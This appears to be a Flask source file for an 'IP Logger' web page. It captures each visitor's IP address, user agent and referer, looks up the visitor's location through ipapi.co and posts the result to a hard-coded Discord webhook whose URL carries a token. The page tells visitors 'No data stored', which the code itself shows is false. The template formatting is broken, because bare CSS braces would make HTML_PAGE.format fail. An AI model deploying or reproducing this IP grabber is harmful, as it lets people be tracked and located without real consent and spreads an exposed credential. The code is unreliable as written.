from flask import Flask, request
import requests
import json
from datetime import datetime, timezone

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1531275791600455920/eqjzGUGNuyHBs9awFBnwWJwV-HLZ_lgNtygrbi_jcUnU8BHiKWhLNh3bnaoM3TA2Nov5"

# In-memory set to track unique IPs
seen_ips = set()

def get_geolocation(ip):
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=4)
        data = resp.json()
        city = data.get('city', 'Unknown')
        region = data.get('region', 'Unknown')
        country = data.get('country_name', 'Unknown')
        return f"{city}, {region}, {country}"
    except:
        return "Geolocation unavailable"

def send_to_discord(ip, user_agent, referer):
    geo = get_geolocation(ip)
    embed = {
        "title": "🌐 New IP Logged",
        "color": 0x00ff00,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": [
            {"name": "IP Address", "value": f"[{ip}](https://ipinfo.io/{ip})", "inline": True},
            {"name": "Geolocation", "value": geo, "inline": True},
            {"name": "User Agent", "value": user_agent[:150] + ("..." if len(user_agent) > 150 else ""), "inline": False},
            {"name": "Referer", "value": referer or "Direct visit", "inline": True}
        ],
        "footer": {"text": "Render IP Logger | Unique IP only"}
    }
    payload = {"embeds": [embed]}
    try:
        r = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        return r.status_code == 204
    except:
        return False

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            overflow: hidden;
        }
        .glow-bg {
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 50% 50%, #00ff0044, #0a0a0a 70%);
            animation: rotate 20s linear infinite;
            z-index: 0;
        }
        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .card {
            position: relative;
            z-index: 1;
            background: rgba(10, 10, 10, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid #00ff0088;
            border-radius: 32px;
            padding: 48px 40px;
            max-width: 480px;
            width: 90%;
            box-shadow: 0 0 60px #00ff0044, inset 0 0 60px #00ff0011;
            text-align: center;
            transition: 0.3s;
        }
        .icon { font-size: 72px; line-height: 1; margin-bottom: 16px; }
        h1 {
            color: #00ff00;
            font-weight: 300;
            letter-spacing: 4px;
            text-transform: uppercase;
            font-size: 28px;
            margin-bottom: 8px;
            text-shadow: 0 0 20px #00ff0088;
        }
        .ip-display {
            background: #00ff0011;
            border: 1px solid #00ff0044;
            border-radius: 16px;
            padding: 16px;
            margin: 24px 0;
            font-family: 'Courier New', monospace;
            font-size: 24px;
            color: #00ff00;
            letter-spacing: 2px;
            word-break: break-all;
        }
        .status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            color: #88ff88;
            font-size: 16px;
            margin-top: 8px;
        }
        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #00ff00;
            box-shadow: 0 0 20px #00ff00;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }
        .sub {
            color: #557755;
            font-size: 13px;
            margin-top: 24px;
            letter-spacing: 1px;
        }
        .checkmark {
            display: inline-block;
            font-size: 28px;
            animation: pop 0.6s ease-out;
        }
        @keyframes pop { 0% { transform: scale(0); opacity: 0; } 80% { transform: scale(1.3); } 100% { transform: scale(1); opacity: 1; } }
        .geo {
            color: #aaffaa;
            font-size: 14px;
            margin-top: 8px;
            opacity: 0.8;
        }
        .seen-badge {
            display: inline-block;
            background: #00ff0022;
            border: 1px solid #00ff0044;
            border-radius: 20px;
            padding: 4px 16px;
            font-size: 12px;
            color: #88ff88;
            margin-top: 12px;
        }
    </style>
</head>
<body>
    <div class="glow-bg"></div>
    <div class="card">
        <div class="icon">🌐</div>
        <h1>IP Logger</h1>
        <div class="ip-display">{ip}</div>
        <div class="geo">📍 Logged – check Discord for full details</div>
        <div class="status">
            <span class="dot"></span>
            <span>{status_text}</span>
            <span class="checkmark">✔</span>
        </div>
        <div class="seen-badge">{badge_text}</div>
        <div class="sub">🔒 Secure · One-time log · No data stored</div>
    </div>
</body>
</html>
"""

@app.route('/')
def log_ip():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if visitor_ip and ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()
    
    # Check if IP already seen
    if visitor_ip in seen_ips:
        status_text = "Already logged – duplicate ignored"
        badge_text = "♻️ Duplicate request – no new log"
        # Return HTML without sending to Discord
        return HTML_PAGE.format(ip=visitor_ip, status_text=status_text, badge_text=badge_text), 200
    
    # New IP – log it
    seen_ips.add(visitor_ip)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer')
    send_to_discord(visitor_ip, user_agent, referer)
    
    status_text = "Logged successfully – first visit"
    badge_text = "✅ New IP logged to Discord"
    return HTML_PAGE.format(ip=visitor_ip, status_text=status_text, badge_text=badge_text), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
